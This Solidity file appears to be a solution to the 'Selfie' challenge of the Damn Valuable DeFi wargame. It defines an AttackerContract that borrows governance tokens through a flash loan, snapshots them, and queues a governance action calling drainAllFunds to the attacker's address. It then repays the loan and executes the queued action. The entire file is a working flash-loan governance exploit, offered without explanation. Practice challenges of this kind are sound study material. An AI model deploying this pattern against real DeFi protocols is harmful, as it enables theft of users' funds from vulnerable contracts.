pragma solidity ^0.6.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackerContract{

	address public attackerAddress;
	SelfiePool public selfiePool;
	SimpleGovernance public governance;
	uint256 public actionCounterId;

	constructor(address poolAddress,address govAddress) public{
		attackerAddress = msg.sender;
		selfiePool = SelfiePool(poolAddress);
		governance = SimpleGovernance(govAddress);
	}

	function attackSelfiePool(uint256 _govTokenAmount) public{
		selfiePool.flashLoan(_govTokenAmount);
	}

	function startFlashLoanTransaction() public{
		selfiePool.flashLoan(1000001 ether);
	}
	
	function receiveTokens(DamnValuableTokenSnapshot snapshotToken,uint256 _govTokenAmount) public{
		snapshotToken.snapshot();
		bytes memory payload = abi.encodeWithSignature(
			"drainAllFunds(address)",
			attackerAddress
			);
		actionCounterId = governance.queueAction(
			address(selfiePool),
			payload,
			0
			);
		snapshotToken.transfer(address(selfiePool),_govTokenAmount);
	}

	function initiateAttack() public{
		bytes memory payload = abi.encodeWithSignature("executeAction(uint256)",actionCounterId);
		(bool success, ) = address(governance).call(payload);
		require (success,"Attack Failed");
		
	}	
}